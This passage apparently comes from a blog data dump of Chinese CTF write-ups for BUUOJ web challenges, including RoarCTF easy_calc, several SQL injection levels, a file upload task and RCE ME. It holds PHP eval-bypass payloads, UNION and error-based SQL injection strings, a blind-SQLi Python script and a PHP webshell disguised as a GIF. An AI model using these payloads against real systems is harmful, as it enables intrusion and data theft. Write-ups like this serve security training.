1\n```\n\n使用PHP内置函数获`file_get_contents()`获取文件内容payload=`?+num=printf(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))`\n\n```\nflag{d09c31b7-d1a1-45a2-b35b-65452a1335ef} 43\n```\n\n","slug":"buuoj刷题记录2","published":1,"updated":"2019-12-26T12:16:12.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck7vssfjj0008pk7e4dzpg9k1","content":"<h2 id=\"Roarctf-easy-calc\"><a href=\"#Roarctf-easy-calc\" class=\"headerlink\" title=\"[Roarctf]easy_calc\"></a>[Roarctf]easy_calc</h2><h3 id=\"0x00-基础\"><a href=\"#0x00-基础\" class=\"headerlink\" title=\"0x00 基础\"></a>0x00 基础</h3><p>php内置读取文件内容函数</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">file_get_contents()</span><br><span class=\"line\">readfile()</span><br><span class=\"line\">file()</span><br></pre></td></tr></table></figure>\n\n<p>目录扫描函数</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">scandir()</span><br></pre></td></tr></table></figure>\n\n<a id=\"more\"></a>\n\n<p>字符转换函数</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hex2bin(<span class=\"string\">\"979797\"</span>)-&gt;<span class=\"string\">\"aaa\"</span></span><br><span class=\"line\">chr(<span class=\"number\">95</span>)-&gt;<span class=\"string\">\"a\"</span></span><br></pre></td></tr></table></figure>\n\n<p>输出函数</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var_dump()</span><br><span class=\"line\">printf()</span><br></pre></td></tr></table></figure>\n\n<p><code>parse_str</code>函数通常被自动应用于<code>get</code>、<code>post</code>请求和<code>cookie</code>中。使用<code>parse_str</code>解析规则绕过waf</p>\n<h3 id=\"0x01-分析\"><a href=\"#0x01-分析\" class=\"headerlink\" title=\"0x01 分析\"></a>0x01 分析</h3><p>查看源码，发现calc.php</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">    $(<span class=\"string\">'#calc'</span>).submit(<span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        $.ajax(&#123;</span><br><span class=\"line\">            url:<span class=\"string\">\"calc.php?num=\"</span>+encodeURIComponent($(<span class=\"string\">\"#content\"</span>).val()),</span><br><span class=\"line\">            type:<span class=\"string\">'GET'</span>,</span><br><span class=\"line\">            success:<span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">(data)</span></span>&#123;</span><br><span class=\"line\">                $(\"#result\").html(`&lt;div class=\"alert alert-success\"&gt;</span><br><span class=\"line\">            &lt;strong&gt;答案:&lt;/strong&gt;$&#123;data&#125;</span><br><span class=\"line\">            &lt;/div&gt;`);</span><br><span class=\"line\">            &#125;,</span><br><span class=\"line\">            error:<span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">                alert(<span class=\"string\">\"这啥?算不来!\"</span>);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">false</span>;</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\">&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n\n<p>进入calc.php,进行代码审计。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">error_reporting(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span>(!<span class=\"keyword\">isset</span>($_GET[<span class=\"string\">'num'</span>]))&#123;</span><br><span class=\"line\">    show_source(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        $str = $_GET[<span class=\"string\">'num'</span>];</span><br><span class=\"line\">        $blacklist = [<span class=\"string\">' '</span>, <span class=\"string\">'\\t'</span>, <span class=\"string\">'\\r'</span>, <span class=\"string\">'\\n'</span>,<span class=\"string\">'\\''</span>, <span class=\"string\">'\"'</span>, <span class=\"string\">'`'</span>, <span class=\"string\">'\\['</span>, <span class=\"string\">'\\]'</span>,<span class=\"string\">'\\$'</span>,<span class=\"string\">'\\\\'</span>,<span class=\"string\">'\\^'</span>];</span><br><span class=\"line\">        <span class=\"keyword\">foreach</span> ($blacklist <span class=\"keyword\">as</span> $blackitem) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (preg_match(<span class=\"string\">'/'</span> . $blackitem . <span class=\"string\">'/m'</span>, $str)) &#123;    </span><br><span class=\"line\">                        <span class=\"keyword\">die</span>(<span class=\"string\">\"what are you want to do?\"</span>);<span class=\"comment\">//如果包含黑名单中的字符，程序退出</span></span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">eval</span>(<span class=\"string\">'echo '</span>.$str.<span class=\"string\">';'</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"0x02-开始操作\"><a href=\"#0x02-开始操作\" class=\"headerlink\" title=\"0x02 开始操作\"></a>0x02 开始操作</h3><p>传入<code>1+1</code> 显示<code>403 Forbidden</code> 传入<code>1%2b1</code>就可以。必须传入url编码后的。查看<code>phpinfo()</code>，也是<code>403 Forbidden</code>，利用PHP自动解析函数<code>parser_str()</code>绕过，详细介绍查看<a href=\"https://www.freebuf.com/articles/web/213359.html\" target=\"_blank\" rel=\"noopener\">参考连接</a>。</p>\n<p>扫描目录使用<code>scandir()</code>因为<code>/ &#39;  &quot;</code>被过滤无法直接使用<code>/</code>，使用<code>chr()</code>转换payload= <code>?+num=print_r(scandir(chr(47)))</code></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">Array</span> ( [<span class=\"number\">0</span>] =&gt; . [<span class=\"number\">1</span>] =&gt; .. [<span class=\"number\">2</span>] =&gt; .dockerenv [<span class=\"number\">3</span>] =&gt; bin [<span class=\"number\">4</span>] =&gt; boot [<span class=\"number\">5</span>] =&gt; dev [<span class=\"number\">6</span>] =&gt; etc [<span class=\"number\">7</span>] =&gt; f1agg [<span class=\"number\">8</span>] =&gt; home [<span class=\"number\">9</span>] =&gt; lib [<span class=\"number\">10</span>] =&gt; lib64 [<span class=\"number\">11</span>] =&gt; media [<span class=\"number\">12</span>] =&gt; mnt [<span class=\"number\">13</span>] =&gt; opt [<span class=\"number\">14</span>] =&gt; proc [<span class=\"number\">15</span>] =&gt; root [<span class=\"number\">16</span>] =&gt; run [<span class=\"number\">17</span>] =&gt; sbin [<span class=\"number\">18</span>] =&gt; srv [<span class=\"number\">19</span>] =&gt; start.sh [<span class=\"number\">20</span>] =&gt; sys [<span class=\"number\">21</span>] =&gt; tmp [<span class=\"number\">22</span>] =&gt; usr [<span class=\"number\">23</span>] =&gt; <span class=\"keyword\">var</span> ) <span class=\"number\">1</span></span><br></pre></td></tr></table></figure>\n\n<p>使用PHP内置函数获<code>file_get_contents()</code>获取文件内容payload=<code>?+num=printf(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">flag&#123;d09c31b7-d1a1-45a2-b35b-65452a1335ef&#125; 43</span><br></pre></td></tr></table></figure>\n\n","site":{"data":{}},"excerpt":"<h2 id=\"Roarctf-easy-calc\"><a href=\"#Roarctf-easy-calc\" class=\"headerlink\" title=\"[Roarctf]easy_calc\"></a>[Roarctf]easy_calc</h2><h3 id=\"0x00-基础\"><a href=\"#0x00-基础\" class=\"headerlink\" title=\"0x00 基础\"></a>0x00 基础</h3><p>php内置读取文件内容函数</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">file_get_contents()</span><br><span class=\"line\">readfile()</span><br><span class=\"line\">file()</span><br></pre></td></tr></table></figure>\n\n<p>目录扫描函数</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">scandir()</span><br></pre></td></tr></table></figure>","more":"<p>字符转换函数</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hex2bin(<span class=\"string\">\"979797\"</span>)-&gt;<span class=\"string\">\"aaa\"</span></span><br><span class=\"line\">chr(<span class=\"number\">95</span>)-&gt;<span class=\"string\">\"a\"</span></span><br></pre></td></tr></table></figure>\n\n<p>输出函数</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var_dump()</span><br><span class=\"line\">printf()</span><br></pre></td></tr></table></figure>\n\n<p><code>parse_str</code>函数通常被自动应用于<code>get</code>、<code>post</code>请求和<code>cookie</code>中。使用<code>parse_str</code>解析规则绕过waf</p>\n<h3 id=\"0x01-分析\"><a href=\"#0x01-分析\" class=\"headerlink\" title=\"0x01 分析\"></a>0x01 分析</h3><p>查看源码，发现calc.php</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">    $(<span class=\"string\">'#calc'</span>).submit(<span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        $.ajax(&#123;</span><br><span class=\"line\">            url:<span class=\"string\">\"calc.php?num=\"</span>+encodeURIComponent($(<span class=\"string\">\"#content\"</span>).val()),</span><br><span class=\"line\">            type:<span class=\"string\">'GET'</span>,</span><br><span class=\"line\">            success:<span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">(data)</span></span>&#123;</span><br><span class=\"line\">                $(\"#result\").html(`&lt;div class=\"alert alert-success\"&gt;</span><br><span class=\"line\">            &lt;strong&gt;答案:&lt;/strong&gt;$&#123;data&#125;</span><br><span class=\"line\">            &lt;/div&gt;`);</span><br><span class=\"line\">            &#125;,</span><br><span class=\"line\">            error:<span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">                alert(<span class=\"string\">\"这啥?算不来!\"</span>);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">false</span>;</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\">&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n\n<p>进入calc.php,进行代码审计。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">error_reporting(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span>(!<span class=\"keyword\">isset</span>($_GET[<span class=\"string\">'num'</span>]))&#123;</span><br><span class=\"line\">    show_source(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        $str = $_GET[<span class=\"string\">'num'</span>];</span><br><span class=\"line\">        $blacklist = [<span class=\"string\">' '</span>, <span class=\"string\">'\\t'</span>, <span class=\"string\">'\\r'</span>, <span class=\"string\">'\\n'</span>,<span class=\"string\">'\\''</span>, <span class=\"string\">'\"'</span>, <span class=\"string\">'`'</span>, <span class=\"string\">'\\['</span>, <span class=\"string\">'\\]'</span>,<span class=\"string\">'\\$'</span>,<span class=\"string\">'\\\\'</span>,<span class=\"string\">'\\^'</span>];</span><br><span class=\"line\">        <span class=\"keyword\">foreach</span> ($blacklist <span class=\"keyword\">as</span> $blackitem) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (preg_match(<span class=\"string\">'/'</span> . $blackitem . <span class=\"string\">'/m'</span>, $str)) &#123;    </span><br><span class=\"line\">                        <span class=\"keyword\">die</span>(<span class=\"string\">\"what are you want to do?\"</span>);<span class=\"comment\">//如果包含黑名单中的字符，程序退出</span></span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">eval</span>(<span class=\"string\">'echo '</span>.$str.<span class=\"string\">';'</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"0x02-开始操作\"><a href=\"#0x02-开始操作\" class=\"headerlink\" title=\"0x02 开始操作\"></a>0x02 开始操作</h3><p>传入<code>1+1</code> 显示<code>403 Forbidden</code> 传入<code>1%2b1</code>就可以。必须传入url编码后的。查看<code>phpinfo()</code>，也是<code>403 Forbidden</code>，利用PHP自动解析函数<code>parser_str()</code>绕过，详细介绍查看<a href=\"https://www.freebuf.com/articles/web/213359.html\" target=\"_blank\" rel=\"noopener\">参考连接</a>。</p>\n<p>扫描目录使用<code>scandir()</code>因为<code>/ &#39;  &quot;</code>被过滤无法直接使用<code>/</code>，使用<code>chr()</code>转换payload= <code>?+num=print_r(scandir(chr(47)))</code></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">Array</span> ( [<span class=\"number\">0</span>] =&gt; . [<span class=\"number\">1</span>] =&gt; .. [<span class=\"number\">2</span>] =&gt; .dockerenv [<span class=\"number\">3</span>] =&gt; bin [<span class=\"number\">4</span>] =&gt; boot [<span class=\"number\">5</span>] =&gt; dev [<span class=\"number\">6</span>] =&gt; etc [<span class=\"number\">7</span>] =&gt; f1agg [<span class=\"number\">8</span>] =&gt; home [<span class=\"number\">9</span>] =&gt; lib [<span class=\"number\">10</span>] =&gt; lib64 [<span class=\"number\">11</span>] =&gt; media [<span class=\"number\">12</span>] =&gt; mnt [<span class=\"number\">13</span>] =&gt; opt [<span class=\"number\">14</span>] =&gt; proc [<span class=\"number\">15</span>] =&gt; root [<span class=\"number\">16</span>] =&gt; run [<span class=\"number\">17</span>] =&gt; sbin [<span class=\"number\">18</span>] =&gt; srv [<span class=\"number\">19</span>] =&gt; start.sh [<span class=\"number\">20</span>] =&gt; sys [<span class=\"number\">21</span>] =&gt; tmp [<span class=\"number\">22</span>] =&gt; usr [<span class=\"number\">23</span>] =&gt; <span class=\"keyword\">var</span> ) <span class=\"number\">1</span></span><br></pre></td></tr></table></figure>\n\n<p>使用PHP内置函数获<code>file_get_contents()</code>获取文件内容payload=<code>?+num=printf(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">flag&#123;d09c31b7-d1a1-45a2-b35b-65452a1335ef&#125; 43</span><br></pre></td></tr></table></figure>"},{"title":"buuoj刷题记录10-极客大挑战web2","date":"2020-01-24T15:37:07.000Z","_content":"\n## 极客大挑战web\n\n### LoveSQL\n\nfuzz了一下发现过滤了空格，单引号报错。如果查询数据为空，返回密码错误\n\n常规操作\n\n<!--more-->\n\n1. #### order by判断字段，字段为3\n\n![](/pic/38.png)\n\n`?username='union+select+1,group_concat(username,',',password),3+from+l0ve1ysq1+limit+0,1+%23&password=123 `\n\n![](/pic/39.png)\n\n2. #### union确定回显，回显位置为2，3\n\n`?username='union+select+1,2,3+%23&password=123`\n\n![](/pic/40.png)\n\n3. #### 查数据库\n\n`?username='union+select+1,database(),3+%23&password=123`\n\n![](/pic/41.png)\n\n4. #### 查表\n\n`?username='union+select+1,group_concat(table_name),3+from+information_schema.tables+where+table_schema='geek'+%23&password=123`\n\n![](/pic/42.png)\n\nl0ve1ysq1、geekuser\n\n5. #### 查列名\n\n`?username='union+select+1,group_concat(column_name),3+from+information_schema.columns+where+table_schema='geek'+and+table_name='l0ve1ysq1'+%23&password=123`\n\n![](/pic/43.png)\n\n`?username='union+select+1,group_concat(column_name),3+from+information_schema.columns+where+table_schema='geek'+and+table_name='geekuser'+%23&password=123`\n\n![](/pic/44.png)\n\n6. #### 查数据\n\n`?username='union+select+1,group_concat(username,',',password),3+from+geekuser+limit+0,1+%23&password=123`\n\ngeekuser只有一个admin\n\n![](/pic/45.png)\n\nl0ve1ysq1表中发现了flag\n\n`?username='union+select+1,group_concat(username,',',password),3+from+l0ve1ysq1+limit+0,1+%23&password=123` \n\n![](/pic/46.png)\n\n\n\n### BabySQL\n\nfuzzing一下，将union,select,and,or,where,from删除\n\n此时可以selselectect将select删除之后就变成了sel ~~select~~ ect\n\n因为和上面的一样，直接查询数据库\n\n1. #### 查数据库\n\n`?username='uniunionon+selselectect+1,database(),3--+&password=123`\n\n数据库名还是geek\n\n2. #### 查询表\n\n```\n?username='uniunionon+selselectect+1,group_concat(table_name),3+frfromom+infoorrmation_schema.tables+wwherehere+table_schema='geek'--+&password=123\n```\n\nb4bsql,geekuser\n\n3. #### 查列名\n\n`?username='uniunionon+selselectect+1,group_concat(column_name),3+frfromom+infoorrmation_schema.columns+wwherehere+table_schema='geek'+anandd+table_name='b4bsql'--+&password=123`\n\n列名还是id,username,password\n\n4. #### 查询数据\n\n`?username='uniunionon+selselectect+1,group_concat(username,passwoorrd),3+frfromom+b4bsql--+&password=123`\n\n![](/pic/47.png)\n\n成功拿到flag\n\n### Http\n\n打开BP，开启拦截，查看site map发现有一个secret.php\n\n![](/pic/48.png)\n\n访问即可\n\n根据提示修改http头\n\n```http\nGET /Secret.php HTTP/1.1\nHost: node3.buuoj.cn:27400\nAccept-Encoding: gzip, deflate\nAccept: */*\nX-Forwarded-for:127.0.0.1\nAccept-Language: en\nReferer:https://www.Sycsecret.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Syclover/20100101 Firefox/72.0\nConnection: close\n\n```\n\n### BuyFlag\n\n点进去有一个payflag界面,\n\n根据提示，\n\n```html\nIf you want to buy the FLAG:\nYou must be a student from CUIT!!!\nYou must be answer the correct password!!! \n\nOnly Cuit's students can buy the FLAG\n```\n\n页面最后有一段注释\n\n```html\n<!--\n\t~~~post money and password~~~\nif (isset($_POST['password'])) {\n\t$password = $_POST['password'];\n\tif (is_numeric($password)) {\n\t\techo \"password can't be number</br>\";\n\t}elseif ($password == 404) {\n\t\techo \"Password Right!</br>\";\n\t}\n}\n-->\n```\n\n这一段注释是对输入的`password`作比较，输入的是404，且能绕过`is_numeric()`函数。\n\n在数字之后面加一个字符就变成了字符串类型，即可绕过。最后面的是弱类型的判断，加了字符之后还是符合的\n\n![](/pic/49.png)\n\n抓包发现有cookie, user=0，改成=1，变成了\n\n```\nyou are Cuiter\nPlease input your password!!\n```\n\n传入数据`password=404a&money=999999999`，他说数据太长，只能传入八位。\n\n之前在南邮的平台上做过一道pass check题目PHP版本是5.3，传入数组即可绕过\n\n`password=404a&money[]=`\n\n### Upload\n\n上传PHP一句话被过滤\n\n![](/pic/50.png)\n\n换成图片后缀jpg进行%00截断，还是被过滤\n\n![](/pic/51.png)\n\n尝试php2,php3,php5都被过滤\n\n![](/pic/52.png)\n\n![](/pic/53.png)\n\n![](/pic/54.png)\n\n只有phtml没有被过滤\n\n![](/pic/55.png)\n\n内容不能出现`<?`可以换成js的写法\n\n![](/pic/56.png)\n\n```js\n<script language=\"php\">\neval($_POST['cmd']);\n</script>\n```\n\n再上传提示必须是图片，添加gif文件头`GIF89a`\n\n![](/pic/57.png)\n\n使用蚁剑，菜刀连接，找到flag\n\n![](/pic/58.png)\n\n### HardSQL\n\nfuzz测试\n\n`AND,BINARY,BY,CHAR,CHAR_LENGTH,CHARACTER,CHARACTER_LENGTH,CLASSIFIER,DROP,HAVING,INSERT,INTO,MODIFIES,NCHAR,NULLIF,SPECIFIC,SPECIFICTYPE,SUBSTRING,SUBSTRING_REGEX,UNION,VARBINARY,VARCHAR,+,/,!,*,||,&&,<,>,ascii,%20,%09`被过滤\n\n输入错误还会报出sql语句错误，考虑报错注入\n\n1. #### 查数据库\n\n   `?username=admin'or(updatexml(0,concat(0,(select(database())),0))%23`还是geek\n\n2. #### 查表\n\n   `?username=admin'or(updatexml(0,concat(0,(select(concat(table_name))from(information_schema.tables)where(table_schema)like('geek'))),0))%23`\n\n   H4rDsq1\n\n3. #### 查列名（应该还是只有id,usname,password）\n\n4. #### 查数据\n\n   `?username=admin'or(updatexml(0,concat(0,(select(concat(password))from(H4rDsq1))),0))%23&password=123`\n\n   `?username=admin'or(updatexml(0,concat(0,(select(reverse(password))from(H4rDsq1))),0))%23&password=123`\n   \n   因为flag超出了32个字符，floor报错注入能显示64个字符，但是by被过滤（本菜鸡找不到解决的办法）。 字符截取函数substr,mid被过滤，使用reverse函数。\n\n\n\n### FinalSQL\n\nfuzz之后发现被过滤的关键字有\n\n![](/pic/59.png)\n\n题目提示有盲注，还给了一个含有ID的界面。注入点再id处，不再是之前的输入框\n\n![](/pic/60.png)\n\n![](/pic/61.png)\n\n根据括号内的数字不同，返回的界面不同，和没被过滤的关键字可以使用盲注\n\n编写盲注脚本\n\n```python\n# -*- coding: utf-8 -*-\nimport requests\n\ndef get(payload):\n    url = 'http://f408e803-8b3e-4c4e-883e-3fb61e29303f.node3.buuoj.cn/search.php?id=1=('+payload+')'\n    html = requests.get(url)\n    # print(html)\n    return html\n\ndef binsea(s_payload,len=999):\n    result = ''\n    x=1\n    while x <= len :\n        error = 0\n        left = 0\n        right = 126\n        while left <= right:\n            mid = (left + right) / 2\n            payload = \"ascii(substr((%s),%d,1))>%d\" % (s_payload,x, mid)\n\n            res = get(payload)\n            if res.status_code == 404 or res.status_code == 429:\n                x=x-1\n                error = 1\n                break\n            html=res.text\n            # print('*-*-*-*-*-*', mid)\n            if 'others' in html:\n                left = mid +1\n            else:\n                right = mid -1\n        mid = int((left + right + 1) / 2)\n        if mid == 0 :\n            break\n        if error == 0 :\n            result += chr(mid)\n            print(result)\n        x=x+1\n    return result\n\ndef get_database():\n    s_payload='database()'\n    database = binsea(s_payload)\n    print(database)\n\ndef get_tabls(db):\n    s_payload = 'select(group_concat(table_name))from(information_schema.tables)where(table_schema=\\''+db+'\\')'\n    tables=binsea(s_payload)\n\ndef get_columns(table):\n    s_payload = 'select(group_concat(column_name))from(information_schema.columns)where(table_name=\\''+table+'\\')'\n    columns=binsea(s_payload)\n\ndef get_data(columns,table):\n    s_payload='select(group_concat('+columns+'))from('+table+')'\n    password=binsea(s_payload)\n\n\n# get_database()\n\n# get_tabls('geek') #F1naI1y,Flaaaaag\n#\n# get_columns('F1naI1y') # id,username,password\n# get_columns('Flaaaaag') # id,fl4gawsl\n\n# get_data('fl4gawsl','Flaaaaag')\nget_data('id,username,password','F1naI1y')\n```\n\n跑出来有两个表F1naI1y,Flaaaaag\n\nF1naI1y表还是只有id,username,password\n\nFlaaaaag表包括id,fl4gawsl\n\n### RCE ME\n\n打开题目有源码\n\n```php\n<?php\nerror_reporting(0);\nif(isset($_GET['code'])){\n            $code=$_GET['code'];\n                    if(strlen($code)>40){  \n                                        die(\"This is too Long.\");\n                                                }\n                    if(preg_match(\"/[A-Za-z0-9]+/\",$code)){\n                                        die(\"NO.\");\n                                                }\n                    @eval($code);\n}\nelse{\n            highlight_file(__FILE__);\n}\n\n// ?>\n```\n\n 传入一个code参数，长度不能大于40，不能包含大小写字母和数字\n\n可以使用取反或者异或拼凑函数\n\n```\n?code=$_=(~?>);$$_{%27__%27}($$_{%27_%27});&_=phpinfo()&__=assert\n```\n\n```\n%A0%AF%B0%AC%AB是_GET的取反的值，$$_{%27__%27}($$_{%27_%27})`就相当于 $_GET{'__'}($_GET{'_'})   联合起来就是assert(phpinfo())\n```\n\n\n\n关于assert函数**\n\nPHP 5 assert ( [mixed](https://www.php.net/manual/zh/language.pseudo-types.php#language.types.mixed) `$assertion` [, string `$description` ] ) : bool\n\nPHP 7 assert ( [mixed](https://www.php.net/manual/zh/language.pseudo-types.php#language.types.mixed) `$assertion` [, Throwable `$exception` ] ) : bool\n\n**assert()** 会检查指定的 `assertion` 并在结果为 **`FALSE`** 时采取适当的行动。\n\n如果 `assertion` 是字符串，它将会被 **assert()** 当做 PHP 代码来执行。 `assertion` 是字符串的优势是当禁用断言时它的开销会更小，并且在断言失败时消息会包含 `assertion` 表达式。 这意味着如果你传入了 boolean 的条件作为 `assertion`，这个条件将不会显示为断言函数的参数；在调用你定义的 [assert_options()](https://www.php.net/manual/zh/function.assert-options.php) 处理函数时，条件会转换为字符串，而布尔值 **`FALSE`** 会被转换成空字符串。\n\n![](/pic/64.png)\n\n先查看phpinfo()\n\n![](/pic/62.png)\n\n禁用了很多执行系统命令的函数\n\n![](/pic/63.png)\n\n```\npcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,dl\n```\n\n扫描当前目录 \n\npost 数据： `_=print_r(scandir(%27./%27))&__=assert`\n\n```\nArray (    [0] => .    [1] => ..    [2] => index.php )\n```\n\n扫描根目录\n\npost数据：`_=print_r(scandir(%27/%27))&__=assert`\n\n```\nArray ( [0] => . [1] => .. [2] => .dockerenv [3] => bin [4] => boot [5] => dev [6] => etc [7] => flag [8] => home [9] => lib [10] => lib64 [11] => media [12] => mnt [13] => opt [14] => proc [15] => readflag [16] => root [17] => run [18] => sbin [19] => srv [20] => sys [21] => tmp [22] => usr [23] => var ) \n```\n\n发现有一个flag文件和一个readflag文件。尝试读取内容\n\n读取flag中的文件是空的；\n\npost数据：`_=var_dump(file_get_contents(%27/flag%27))&__=assert`\n\npost数据：`_=var_dump(file_get_contents(%27/readflag%27))&__=assert`\n\n```\nstring(8856) \"ELF\u0002\u0001\u0001\u0003>\u0001�\u0006@�\u001a@8 @\u001f\u001e\u0006\u0005@@@�\u0001�\u0001\b\u0003\u00048\u00028\u00028\u0002\u001c\u001c\u0001\u0001\u0005\f \f \u0001\u0006� � � x\u0002�\u0002 \u0002\u0006� � � �\u0001�\u0001\b\u0004\u0004T\u0002T\u0002T\u0002DD\u0004P�td\u0004�\b�\b�\b<<\u0004Q�td\u0006\u0010R�td\u0004� � � (\u0002(\u0002\u0001/lib64/ld-linux-x86-64.so.2\u0004\u0010\u0001GNU\u0002\u0006 \u0004\u0014\u0003GNU�íf­CI�`[Xa\f���V�\u0001\u0001\u0001Q \u001a\u0012?\u0012m 8\u0012| � 